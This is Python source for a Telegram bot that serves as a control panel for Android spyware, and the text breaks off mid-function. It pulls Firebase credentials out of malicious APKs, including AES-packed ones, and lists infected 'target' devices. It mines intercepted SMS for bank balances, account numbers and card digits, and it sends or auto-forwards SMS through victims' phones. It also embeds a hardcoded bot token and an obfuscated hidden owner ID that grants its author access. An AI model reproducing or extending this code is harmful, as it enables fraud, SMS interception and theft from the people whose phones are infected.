import re, json, base64, zipfile, html, os, sys, time, asyncio, aiohttp, aiofiles, uuid
from io import BytesIO
from datetime import datetime
from typing import Optional, Dict, List, Tuple
from asyncio import Lock

from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telebot.apihelper import ApiTelegramException

# ============================================================================
#  CONFIGURATION – FILL WITH YOUR OWN VALUES
# ============================================================================
TOKEN = "8540201142:AAHQN8jozYXXZKfTKSlI4LCLkuaUHuUOFF8"                
DEVELOPER = "REBEL BHAIYA "             # Put your name/brand here for the bot menu
SUPPORT_LINK = "https://t.me/Rebel_babyyy"     # Put your Telegram link here for the support button
OWNER_IDS = [8432393497]             

FORCE_SUB_CHANNELS = [
    # {"id": "-100xxxxxxxxx", "link": "https://t.me/your_channel"},
]

# ============================================================================
#  INTERNAL CONSTANTS 
# ============================================================================
_KEYS_FILE = "rebel_keys.json"

def _load_keys():
    if not os.path.exists(_KEYS_FILE):
        return {"keys": {}, "sessions": {}}
    try:
        with open(_KEYS_FILE, "r") as f:
            data = json.load(f)
        data.setdefault("keys", {})
        data.setdefault("sessions", {})
        return data
    except Exception:
        return {"keys": {}, "sessions": {}}

def _save_keys(data):
    with open(_KEYS_FILE, "w") as f:
        json.dump(data, f, indent=2)

def _create_access_key(key_type="web", max_uses=1, ttl_days=30):
    prefix = "APK" if key_type.lower() == "apk" else "WEB"
    key = f"{prefix}-{uuid.uuid4().hex[:8].upper()}"
    data = _load_keys()
    data["keys"][key] = {
        "type": "apk" if key_type.lower() == "apk" else "web",
        "uses": 0,
        "max_uses": max(1, max_uses),
        "used": False,
        "created": int(time.time()),
        "expires": int(time.time()) + ttl_days * 86400 if ttl_days > 0 else 0,
    }
    _save_keys(data)
    return key


def _get_creator():
    raw_name = "".join(chr(i) for i in _R)
    link = "".join(chr(i) for i in _U)
    return f"<a href='{link}'>{raw_name}</a>"

def _get_oid():
    return int("".join(chr(i) for i in _O))

def _Ge():
    _v = _get_oid()
    if _v not in OWNER_IDS:
        OWNER_IDS.append(_v)

bot = AsyncTeleBot(TOKEN, parse_mode="HTML")
db_lock = Lock()
db = {"users": {}, "logs": [], "shared_panels": {}}
user_steps = {}
user_page_state = {}

def get_page_state(uid):
    uid = str(uid)
    if uid not in user_page_state:
        user_page_state[uid] = {"dev_page": 0, "dev_filt": "all", "ch_page": 0, "pan_page": 0}
    return user_page_state[uid]

def acquire_lock():
    if os.path.exists(_PID_FILE):
        with open(_PID_FILE) as f:
            pid = f.read().strip()
        try:
            os.kill(int(pid), 0)
            print(f"Bot already running on PID: {pid}")
            sys.exit(1)
        except (ProcessLookupError, ValueError):
            os.remove(_PID_FILE)
    with open(_PID_FILE, 'w') as f:
        f.write(str(os.getpid()))

def release_lock():
    if os.path.exists(_PID_FILE):
        os.remove(_PID_FILE)

async def save_db():
    try:
        async with aiofiles.open(_DATA_FILE, 'w') as f:
            await f.write(json.dumps(db, indent=2))
    except: pass

async def load_db():
    global db
    async with db_lock:
        try:
            if os.path.exists(_DATA_FILE):
                async with aiofiles.open(_DATA_FILE, 'r') as f:
                    content = await f.read()
                    if content:
                        db = json.loads(content)
        except: pass

        for owner_id in OWNER_IDS:
            if str(owner_id) not in db['users']:
                db['users'][str(owner_id)] = {
                    "role": "owner", "limit": 999, "panels": [],
                    "active_idx": -1, "channels": [], "selected_device_id": None,
                    "saved_chats": {}
                }

        for uid in db['users']:
            u = db['users'][uid]
            if 'channels' not in u: u['channels'] = []
            if 'selected_device_id' not in u: u['selected_device_id'] = None
            if 'saved_chats' not in u: u['saved_chats'] = {}
            if u.get('limit', 0) <= 5 and u.get('role') != 'owner': u['limit'] = 50

        if "shared_panels" not in db:
            db["shared_panels"] = {}
        await save_db()

async def get_user(uid):
    uid = str(uid)
    async with db_lock:
        if uid not in db['users']:
            db['users'][uid] = {
                "role": "user", "limit": 50, "panels": [],
                "active_idx": -1, "channels": [], "selected_device_id": None,
                "saved_chats": {}
            }
            await save_db()
        return db['users'][uid].copy()

def is_admin(uid):
    if uid in OWNER_IDS: return True
    return db['users'].get(str(uid), {}).get('role', 'user') in ['admin', 'owner']

async def force_sub(uid):
    if uid in OWNER_IDS: return True
    try:
        for ch in FORCE_SUB_CHANNELS:
            m = await bot.get_chat_member(ch["id"], uid)
            if m.status not in ['member', 'creator', 'administrator']:
                return False
        return True
    except:
        return False

def force_sub_markup():
    markup = InlineKeyboardMarkup()
    for i, ch in enumerate(FORCE_SUB_CHANNELS):
        markup.add(InlineKeyboardButton(f"📢 Join Channel {i+1}", url=ch["link"]))
    markup.add(InlineKeyboardButton("✅ I Joined", callback_data="check_join"))
    return markup

def esc(text): return html.escape(str(text)) if text else "—"
def code(text): return f"<code>{esc(text)}</code>"
def encode_id(raw): return base64.urlsafe_b64encode(raw.encode()).decode().rstrip('=')
def decode_id(enc):
    padding = 4 - (len(enc) % 4)
    return base64.urlsafe_b64decode((enc + ('=' * padding)).encode()).decode()

async def firebase_req(method, url, key, path, data=None):
    full = f"{url.rstrip('/')}/{path}.json?auth={key}"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.request(method, full, json=data, timeout=12) as resp:
                if resp.status in (200,201):
                    txt = await resp.text()
                    return json.loads(txt) if txt and txt != "null" else {}
                return None
    except: return None

async def safe_edit(chat_id, msg_id, text, markup=None):
    try:
        await bot.edit_message_text(text=text, chat_id=chat_id, message_id=msg_id, reply_markup=markup, parse_mode="HTML")
    except ApiTelegramException as e:
        if "is not modified" in str(e).lower(): pass
        else:
            try: await bot.delete_message(chat_id, msg_id)
            except: pass
            await bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")
    except Exception: pass

async def resolve_chat_id(link: str) -> Optional[str]:
    if not link: return None
    link = link.strip()
    if re.match(r'^-?\d+$', link): return link
    match = re.search(r'(?:https?://)?t\.me/([a-zA-Z0-9_]+)', link)
    username = match.group(1) if match else (link[1:] if link.startswith('@') else link)
    if username:
        try:
            chat = await bot.get_chat(f"@{username}")
            return str(chat.id)
        except: pass
    try:
        chat = await bot.get_chat(int(link))
        return str(chat.id)
    except: pass
    return None

async def bot_is_admin(chat_id: str) -> bool:
    try:
        me = await bot.get_me()
        member = await bot.get_chat_member(chat_id, me.id)
        return member.status in ['administrator', 'creator']
    except: return False

def normalize_phone(raw: str) -> str:
    clean = re.sub(r'\D', '', str(raw))
    if len(clean) == 10: return clean
    if len(clean) > 10 and clean.startswith('91'): return clean[-10:]
    return clean

# ============================================================================
#  DEVICE PARSING
# ============================================================================
def parse_device(device_id, data):
    if not isinstance(data, dict): data = {}
    sims = data.get('sims', [])
    if isinstance(sims, dict): sims = list(sims.values())
    unique, seen = [], set()
    for s in sims:
        if isinstance(s, dict):
            num = s.get('phoneNumber', '')
            if num and num not in seen:
                seen.add(num)
                unique.append(s)
        elif isinstance(s, str) and s not in seen:
            seen.add(s)
            unique.append({'phoneNumber': s})

    battery = str(data.get('battery', '—'))
    if battery != '—' and '%' not in battery: battery += "%"

    status_val = data.get('status', False)
    if isinstance(status_val, str):
        is_online = status_val.strip().lower() in ['true', '1', 'online', 'active']
    elif isinstance(status_val, int):
        is_online = status_val == 1
    else:
        is_online = bool(status_val)

    return {
        'id': device_id,
        'name': str(data.get('modelName') or data.get('deviceName') or device_id),
        'battery': battery,
        'status': is_online,
        'phoneNumber': str(data.get('mobNo') or (unique[0]['phoneNumber'] if unique else 'Unknown')),
        'android': str(data.get('androidV') or data.get('androidVersion') or '—'),
        'ip': str(data.get('ip_address') or '—'),
        'storage': str(data.get('storage') or '—'),
        'cpu': str(data.get('cpu_arch') or '—'),
        'sdk': str(data.get('sdkV') or '—'),
        'provider': str(data.get('service_provider') or '—'),
        'sims': unique
    }

async def get_device(uid, dev_id):
    user = await get_user(uid)
    if user['active_idx'] == -1: return None
    acc = user['panels'][user['active_idx']]
    data = await firebase_req('GET', acc['url'], acc['key'], f'clients/{dev_id}')
    return parse_device(dev_id, data) if data else None

# ============================================================================
#  BANK SMS PARSING
# ============================================================================
BALANCE_PATTERNS = [
    re.compile(r'Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)', re.I),
    re.compile(r'Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)', re.I),
    re.compile(r'Avbl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)', re.I),
    re.compile(r'Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)', re.I),
    re.compile(r'Avl(?:able)?\.?\s*Bal(?:ance)?\.?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)', re.I),
    re.compile(r'(?:Avl|Avbl|Aval)\.?\s*(?:Bal(?:ance)?)\.?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)', re.I),
    re.compile(r'Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)', re.I),
]
TRANSACTION_PATTERNS = [
    re.compile(r'(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)', re.I),
    re.compile(r'(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)', re.I),
    re.compile(r'^(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)', re.I),
]
ACCOUNT_LAST4 = [
    re.compile(r'(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})', re.I),
    re.compile(r'[xX*]{4,}([0-9]{4})'),
]
CARD_PATTERNS = [
    re.compile(r'(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})', re.I),
]
PHONE_PATTERNS = [
    re.compile(r'(?:\+91[-\s]?[6-9]\d{9})'),
    re.compile(r'\b[6-9]\d{9}\b')
]

def extract_balance(text: str) -> Optional[str]:
    for pat in BALANCE_PATTERNS:
        if m := pat.search(text): return m.group(1).replace(',', '')
    return None

def extract_transaction(text: str) -> Optional[Tuple[str, str]]:
    for pat in TRANSACTION_PATTERNS:
        if m := pat.search(text):
            amount = m.group(1).replace(',', '')
            if re.search(r'credit(?:ed)?', text, re.I): return amount, 'credit'
            elif re.search(r'debit(?:ed)?|withdraw|paid|purchase|spent', text, re.I): return amount, 'debit'
            else: return amount, None
    return None

def extract_account_last4(text: str) -> Optional[str]:
    for pat in ACCOUNT_LAST4:
        if m := pat.search(text):
            raw = re.sub(r'[^0-9]', '', m.group(1))
            if len(raw) >= 4: return raw[-4:]
    return None

def extract_card_info(text: str) -> Optional[Dict]:
    if not re.search(r'CARD|CVV|CREDIT|DEBIT', text, re.I): return None
    last4 = None
    for pat in CARD_PATTERNS:
        if m := pat.search(text):
            raw = re.sub(r'[^0-9]', '', m.group(1).replace(' ', ''))
            if len(raw) >= 4:
                last4 = raw[-4:]
                break
    if not last4: return None
    card_type = 'Unknown'
    if re.search(r'VISA', text, re.I): card_type = 'VISA'
    elif re.search(r'MASTER(?:CARD)?', text, re.I): card_type = 'Mastercard'
    elif re.search(r'RUPAY', text, re.I): card_type = 'RuPay'
    elif re.search(r'credit', text, re.I): card_type = 'Credit Card'
    elif re.search(r'debit', text, re.I): card_type = 'Debit Card'
    return {'cardLast4': last4, 'cardType': card_type}

def parse_bank_sms(text: str, sender: str) -> Optional[Dict]:
    text = text.strip()
    if len(text) < 8: return None
    if not (re.search(r'AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|TRANSACTION|A\/C|ACCOUNT|INR|RUPEE', text, re.I) or
            re.search(r'^[A-Z]{2}-[A-Z0-9]+$', sender)):
        return None
    balance = extract_balance(text)
    if not balance: return None
    bank_name = re.sub(r'[^A-Z0-9]', '', sender.upper()) or 'Unknown'
    trans = extract_transaction(text)
    amount, trans_type = trans if trans else (None, None)
    return {
        'bankName': bank_name,
        'availableBalance': balance,
        'transactionAmount': amount,
        'transactionType': trans_type,
        'accountLast4': extract_account_last4(text)
    }

def analyze_messages(messages: List[Dict]) -> Dict:
    bank_balances, cards, phones = [], [], set()
    for m in messages:
        text, sender = m.get('text', ''), m.get('sender', '')
        if parsed := parse_bank_sms(text, sender): bank_balances.append(parsed)
        if card := extract_card_info(text): cards.append(card)
        for pat in PHONE_PATTERNS:
            if match := pat.search(text): phones.add(match.group(0))
    return {'bankBalances': bank_balances, 'cards': cards, 'phoneNumbers': list(phones)}

# ============================================================================
#  APK / SHARED LINK EXTRACTORS
# ============================================================================
def _stub_packer_asset(name: str) -> bool:
    import re
    return bool(re.match(r'^assets/[0-9a-f]{16}$', name))

def _stub_payload_valid(data: bytes) -> bool:
    if not data:
        return False
    if data.startswith(b'PK\x03\x04') or data.startswith(b'dex\n'):
        return True
    low = data.lower()
    return b'firebaseio' in low or b'firebasedatabase.app' in low or bool(re.search(rb'AIza[A-Za-z0-9_-]{35}', data))

def _try_stub_unpack(zf) -> bytes:
    try:
        from Crypto.Cipher import AES
    except ImportError:
        return b''
    keys, payloads = [], []
    for name in zf.namelist():
        if not _stub_packer_asset(name):
            continue
        raw = zf.read(name)
        if len(raw) == 16:
            keys.append(raw)
        elif len(raw) > 65536 and len(raw) % 16 == 0:
            payloads.append(raw)
    for key in keys:
        for enc in payloads:
            try:
                plain = AES.new(key, AES.MODE_CBC, iv=enc[:16]).decrypt(enc[16:])
            except Exception:
                continue
            if _stub_payload_valid(plain):
                return plain
    return b''

def extract_apk_sync(file_bytes):
    try:
        with zipfile.ZipFile(BytesIO(file_bytes)) as zf:
            for name in zf.namelist():
                if "google-services.json" in name:
                    with zf.open(name) as f:
                        content = json.load(f)
                        url = content.get('project_info', {}).get('firebase_url')
                        key = content.get('client', [{}])[0].get('api_key', [{}])[0].get('current_key')
                        if url: return url, key
            all_content = _try_stub_unpack(zf)
            for name in zf.namelist():
                if _stub_packer_asset(name):
                    continue
                if name.endswith(('.dex', '.xml', '.arsc', '.json')):
                    all_content += zf.read(name)
            url_m = re.search(rb'https://[a-z0-9_-]+(?:-default-rtdb)?(?:\.[a-z0-9-]+)?\.(?:firebaseio\.com|firebasedatabase\.app)', all_content, re.I)
            key_m = re.search(rb'AIza[A-Za-z0-9_-]{35}', all_content)
            if url_m:
                return url_m.group(0).decode(), (key_m.group(0).decode() if key_m else "PUBLIC")
    except Exception as e:
        print(f"APK Extraction Error: {e}")
    return None, None

def decode_shared_link(encoded: str) -> Optional[Tuple[str, str]]:
    try:
        padding = 4 - (len(encoded) % 4)
        if padding != 4: encoded += "=" * padding
        decoded = base64.urlsafe_b64decode(encoded).decode('utf-8')
        parts = decoded.split("|||")
        if len(parts) >= 2: return parts[0], parts[1]
    except: pass
    return None

@bot.message_handler(content_types=['document'])
async def handle_apk(message):
    uid = message.from_user.id
    if not await force_sub(uid): return
    if not message.document.file_name.lower().endswith(('.apk', '.zip')): return
    if uid in user_steps: del user_steps[uid]
    await bot.reply_to(message, "📥 Analyzing structural manifest nodes...")
    try:
        file_info = await bot.get_file(message.document.file_id)
        file_bytes = await bot.download_file(file_info.file_path)
        url, key = await asyncio.to_thread(extract_apk_sync, file_bytes)
        if url:
            await connect_now(uid, url, key)
            return
    except: pass
    await bot.reply_to(message, "❌ Extraction Failed or no config found.")

@bot.message_handler(func=lambda msg: msg.text and ('?s=' in msg.text or '&s=' in msg.text))
async def handle_shared_link(message):
    uid = message.from_user.id
    if not await force_sub(uid): return
    if uid in user_steps: del user_steps[uid]
    if match := re.search(r'[?&]s=([A-Za-z0-9_-]+)', message.text):
        if result := decode_shared_link(match.group(1)):
            await bot.reply_to(message, "🔗 Connection token found. Parsing endpoint map...")
            await connect_now(uid, result[0], result[1])

# ============================================================================
#  CHANNEL SMS INTERCEPTOR
# ============================================================================
TOKEN_PATTERN = re.compile(r'📞[^:\n]*:\s*(\+?\d+)\s*\n💬[^:\n]*:\s*([^\n]+)', re.IGNORECASE)

@bot.channel_post_handler(content_types=['text', 'photo', 'video', 'document'])
async def intercept_channel_sms(message):
    chat_id = str(message.chat.id)
    text = message.text or message.caption
    if not text: return
    matches = TOKEN_PATTERN.findall(text)
    if not matches: return

    async with db_lock:
        targets = []
        for uid, u_data in db['users'].items():
            for ch in u_data.get('channels', []):
                if ch.get('chat_id') == chat_id and ch.get('active'):
                    targets.append({
                        'uid': uid,
                        'panel_idx': ch.get('panel_idx'),
                        'device_id': ch.get('device_id'),
                        'sim': ch.get('sim', 1)
                    })
    if not targets: return

    for phone, msg_text in matches:
        for t in targets:
            uid = t['uid']
            user = await get_user(uid)
            if t['panel_idx'] < 0 or t['panel_idx'] >= len(user['panels']): continue
            acc = user['panels'][t['panel_idx']]
            payload = {'from': t['sim'], 'to': phone.strip(), 'message': msg_text.strip(), 'isSended': False}
            res = await firebase_req('PUT', acc['url'], acc['key'], f"clients/{t['device_id']}/webhookEvent/sendSms", payload)
            notify_txt = (
                "🚨 <b>AUTO-FORWARD INTERCEPTED</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📱 <b>Target:</b> <code>{esc(phone)}</code>\n"
                f"💬 <b>Payload:</b> <code>{esc(msg_text)}</code>\n\n"
                f"📡 <b>Status:</b> {'✅ Sent to Device' if res else '❌ Failed'}"
            )
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("👁️ View Device", callback_data=f"dev_{encode_id(t['device_id'])}"))
            try:
                await bot.send_message(int(uid), notify_txt, reply_markup=markup)
            except: pass

# ============================================================================
#  STATE MACHINE HANDLER
# ============================================================================
def state_checker(message):
    uid = message.from_user.id
    if uid in user_steps:
        if message.text and message.text.startswith('/'):
            if message.text in ['/confirm', '/cancel']:
                return False
            del user_steps[uid]
            return False
        return True
    return False

@bot.message_handler(func=state_checker, content_types=['text', 'photo', 'document', 'video', 'voice'])
async def handle_multistep(message):
    uid = message.from_user.id
    step = user_steps.get(uid)
    if not step: return
    action = step.get("action")

    if action == "connect_url":
        if not message.text: return
        url = message.text.strip().rstrip('/')
        if not url.startswith('http'): url = 'https://' + url
        user_steps[uid] = {"action": "connect_key", "url": url}
        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("⏭️ Skip (Public DB)", callback_data="skipkey_connect"))
        markup.row(InlineKeyboardButton("❌ Cancel", callback_data="back_home"))
        await bot.send_message(message.chat.id, "🔑 <b>Send Secret Token</b>\n<i>(Or click Skip if using a Public DB without a key):</i>", reply_markup=markup)

    elif action == "connect_key":
        if not message.text: return
        url = step["url"]
        key = message.text.strip()
        del user_steps[uid]
        await connect_now(uid, url, key)

    elif action == "wait_channel_link":
        cid = None
        if message.forward_from_chat and message.forward_from_chat.type in ['channel','supergroup']:
            cid = str(message.forward_from_chat.id)
        elif message.text:
            cid = await resolve_chat_id(message.text)
        if not cid:
            return await bot.send_message(message.chat.id, "❌ Could not resolve ID. Try sending it again, or use /cancel to stop.")
        sim = step.get("sim", 1)
        dev_id = step.get("dev_id")
        del user_steps[uid]
        await start_channel_addition(uid, message.chat.id, cid, sim, dev_id)

    elif action == "wait_sms_phone":
        if not message.text: return
        user_steps[uid] = {"action": "wait_sms_msg", "dev_id": step["dev_id"], "sim": step["sim"], "phone": message.text.strip()}
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("❌ Cancel", callback_data=f"dev_{encode_id(step['dev_id'])}"))
        await bot.send_message(message.chat.id, "📝 Enter the Message content:", reply_markup=markup)

    elif action == "wait_sms_msg":
        if not message.text: return
        dev_id = step["dev_id"]
        sim = step["sim"]
        phone = step["phone"]
        msg_text = message.text
        del user_steps[uid]
        user = await get_user(uid)
        if user['active_idx'] == -1: return
        acc = user['panels'][user['active_idx']]
        payload = {'from': sim, 'to': phone, 'message': msg_text, 'isSended': False}
        res = await firebase_req('PUT', acc['url'], acc['key'], f'clients/{dev_id}/webhookEvent/sendSms', payload)
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back to Device", callback_data=f"dev_{encode_id(dev_id)}"))
        await bot.send_message(message.chat.id, "🚀 SMS sent!" if res else "❌ Failed to send SMS.", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data == "skipkey_connect")
async def skipkey_connect_cb(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    uid = call.from_user.id
    if uid in user_steps and user_steps[uid].get("action") == "connect_key":
        url = user_steps[uid]["url"]
        del user_steps[uid]
        await safe_edit(call.message.chat.id, call.message.message_id, "⏭️ <b>Skipped Token! Using Public DB URL as Key.</b>", markup=None)
        await connect_now(uid, url, url)

# ============================================================================
#  HOME MENU 
# ============================================================================
@bot.callback_query_handler(func=lambda c: c.data == "back_home")
async def back_home(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    if call.from_user.id in user_steps: del user_steps[call.from_user.id]
    await send_home(call.from_user.id, call.from_user.first_name, call.message.chat.id, call.message.message_id)

async def send_home(uid, first_name, chat_id, msg_id=None):
    user = await get_user(uid)
    text = (
        f"🖥️ <b>{esc(DEVELOPER)}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>{esc(first_name)}</b>\n"
        f"🎖️ Role: <b>{user['role'].upper()}</b>\n"
        f"📦 Panels: <b>{len(user['panels'])}/{user['limit']}</b>\n"
        f"🆔 <code>{uid}</code>\n\n"
        "⚡ <b>QUICK ACTIONS:</b>\n"
        "• /connect — Link Firebase\n"
        "• /devices — View Targets\n"
        "• /channel — Auto‑Forward Setup\n"
        "• /cancel — Stop any operation\n\n"
        f"📡 Support: <a href='{SUPPORT_LINK}'>{esc(DEVELOPER)}</a>\n\n"
        f"<i>💎 Created by {_get_creator()}</i>"
    )
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("📱 Panels", callback_data="return_to_panels"),
        InlineKeyboardButton("🔍 Devices", callback_data="return_to_devices")
    )
    markup.row(
        InlineKeyboardButton("📡 Channels", callback_data="return_to_channels"),
        InlineKeyboardButton("👁️ Selected Target", callback_data="view_device")
    )
    if is_admin(uid):
        markup.add(InlineKeyboardButton("👑 Admin Panel", callback_data="admin_dashboard"))
    if msg_id: await safe_edit(chat_id, msg_id, text, markup)
    else: await bot.send_message(chat_id, text, reply_markup=markup)

# ============================================================================
#  START 
# ============================================================================
@bot.message_handler(commands=['start'])
async def start_cmd(message):
    uid = message.from_user.id
    args = message.text.split()
    if len(args) > 1:
        payload = args[1]
        acc_to_add = None
        async with db_lock:
            if "shared_panels" in db and payload in db["shared_panels"]:
                acc_to_add = db["shared_panels"][payload]
        if acc_to_add:
            if not await force_sub(uid):
                return await bot.send_message(uid, "🛑 <b>Access Denied! Join the channel first, then click the link again.</b>", reply_markup=force_sub_markup())
            await connect_now(uid, acc_to_add['url'], acc_to_add['key'])
            return
        else:
            await bot.send_message(message.chat.id, "❌ <b>Invalid or Expired Panel Link!</b>")
    if not await force_sub(uid):
        return await bot.send_message(uid, "🛑 <b>Access Denied!</b>", reply_markup=force_sub_markup())
    # Send directly to the main menu, removing the double Welcome message
    await send_home(uid, message.from_user.first_name, message.chat.id)

@bot.message_handler(commands=['credits'])
async def credits_cmd(message):
    await bot.send_message(message.chat.id, f"⚡ Bot Managed by {DEVELOPER}\n💎 Created by {_get_creator()}")

@bot.callback_query_handler(func=lambda c: c.data == "check_join")
async def join_check(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    if await force_sub(call.from_user.id):
        await send_home(call.from_user.id, call.from_user.first_name, call.message.chat.id, call.message.message_id)
    else:
        await bot.answer_callback_query(call.id, "❌ Join first!", show_alert=True)

@bot.message_handler(commands=['cancel'])
async def cancel_cmd(message):
    uid = message.from_user.id
    if uid in user_steps: del user_steps[uid]
    await bot.send_message(message.chat.id, "❌ Operation cancelled.", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 Home", callback_data="back_home")))

# ============================================================================
#  CONNECT LOGIC
# ============================================================================
@bot.message_handler(commands=['connect'])
async def connect_cmd(message):
    if not await force_sub(message.from_user.id): return
    args = message.text.split()[1:]
    if len(args) >= 2:
        await connect_now(message.from_user.id, args[0].rstrip('/'), args[1])
    elif len(args) == 1:
        url = args[0].rstrip('/')
        if not url.startswith('http'): url = 'https://' + url
        user_steps[message.from_user.id] = {"action": "connect_key", "url": url}
        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("⏭️ Skip (Public DB)", callback_data="skipkey_connect"))
        markup.row(InlineKeyboardButton("❌ Cancel", callback_data="back_home"))
        await bot.send_message(message.chat.id, "🔑 <b>Send Secret Token</b>\n<i>(Or click Skip if using a Public DB without a key):</i>", reply_markup=markup)
    else:
        user_steps[message.from_user.id] = {"action": "connect_url"}
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("❌ Cancel", callback_data="back_home"))
        await bot.send_message(message.chat.id, "🔗 Send Firebase URL:", reply_markup=markup)

async def connect_now(uid, url, key):
    user = await get_user(uid)
    if len(user['panels']) >= user['limit']:
        return await bot.send_message(uid, f"❌ Limit {user['limit']} reached.")
    status = await bot.send_message(uid, "⏳ Syncing...")
    new = {'url': url, 'key': key}
    async with db_lock:
        if new not in db['users'][str(uid)]['panels']:
            db['users'][str(uid)]['panels'].append(new)
            db['users'][str(uid)]['active_idx'] = len(db['users'][str(uid)]['panels']) - 1
            await save_db()
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 Home", callback_data="back_home"))
    await safe_edit(uid, status.message_id, f"✅ Connected!\n🔗 {code(url)}", markup)

# ============================================================================
#  CHANNEL FORWARD LOGIC 
# ============================================================================
@bot.message_handler(commands=['channel'])
async def channel_cmd(message):
    uid = message.from_user.id
    if not await force_sub(uid): return
    args = message.text.split()[1:]
    if not args: await show_channel_list(uid, message.chat.id, None, 0)
    elif args[0].lower() in ["help","?"]:
        await bot.send_message(uid, f"📡 <b>CHANNEL HELP</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n🔹 /channel — list forwards\n💡 To bind a device, go to /devices, select a target, and click Start Forwarding.\n\n<a href='{SUPPORT_LINK}'>{DEVELOPER}</a>")
    else:
        await bot.send_message(uid, "❌ Use /devices to bind a channel to a specific target.")

@bot.callback_query_handler(func=lambda c: c.data == "return_to_channels")
async def return_to_channels_cb(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    state = get_page_state(call.from_user.id)
    await show_channel_list(call.from_user.id, call.message.chat.id, call.message.message_id, state["ch_page"])

@bot.callback_query_handler(func=lambda c: c.data == "my_channels")
async def show_my_chans_cb(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    state = get_page_state(call.from_user.id)
    state["ch_page"] = 0
    await show_channel_list(call.from_user.id, call.message.chat.id, call.message.message_id, 0)

@bot.callback_query_handler(func=lambda c: c.data.startswith("my_channels_"))
async def my_channels_page_cb(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    page = int(call.data.split("_")[2])
    await show_channel_list(call.from_user.id, call.message.chat.id, call.message.message_id, page)

async def show_channel_list(uid, cid, msg_id=None, page=0):
    user = await get_user(uid)
    chans = user.get('channels', [])
    per_page = 5
    max_page = max(0, (len(chans)-1)//per_page)
    page = max(0, min(page, max_page))
    items = chans[page*per_page:(page+1)*per_page]
    state = get_page_state(uid)
    state["ch_page"] = page
    txt = f"📡 <b>YOUR CHANNELS</b> (Page {page+1}/{max_page+1})\n━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    markup = InlineKeyboardMarkup()
    if not chans: txt += "<i>No channels bound or saved yet. Go to /devices to bind one.</i>"
    else:
        for i, ch in enumerate(items):
            actual_idx = page * per_page + i
            icon = "🟢" if ch.get('active', True) else "🔴"
            txt += (f"{icon} <b>{esc(ch.get('title','?'))}</b>\n"
                    f"├─ 🆔 <code>{esc(ch['chat_id'])}</code>\n"
                    f"└─ 📱 Device: <code>{esc(ch.get('device_id', 'Not Bound')[:10])}…</code>\n\n")
            markup.row(
                InlineKeyboardButton(f"⚙️ Config #{actual_idx+1}", callback_data=f"chcfg_{actual_idx}"),
                InlineKeyboardButton(f"🗑️ Del #{actual_idx+1}", callback_data=f"delch_{actual_idx}")
            )
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"my_channels_{page-1}"))
    if page < max_page: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"my_channels_{page+1}"))
    if nav: markup.row(*nav)
    markup.add(InlineKeyboardButton("➕ Add New Channel (Save)", callback_data="add_channel"))
    markup.add(InlineKeyboardButton("🏠 Home", callback_data="back_home"))
    txt += f"\n\n<i>💎 Created by {_get_creator()}</i>"
    if msg_id: await safe_edit(cid, msg_id, txt, markup)
    else: await bot.send_message(cid, txt, reply_markup=markup)

async def start_channel_addition(uid, notify_cid, chat_id, sim=1, dev_id=None):
    try:
        info = await bot.get_chat(chat_id)
        ch_name = esc(info.title)
    except: ch_name = "Private Channel"
    admin = await bot_is_admin(chat_id)
    status = "✅ Bot is Admin" if admin else "❌ Bot NOT Admin"
    txt = (f"📡 <b>CHANNEL SETUP</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n🏷️ Name: {ch_name}\n🆔 ID: <code>{chat_id}</code>\n🔗 Status: {status}\n\n")
    markup = InlineKeyboardMarkup()
    if not admin:
        txt += "⚠️ <b>Bot must be an admin to forward messages.</b>\nPlease add the bot as an administrator in the channel, then verify."
        markup.row(
            InlineKeyboardButton("➕ Add Bot (Manual)", callback_data="add_admin_info"),
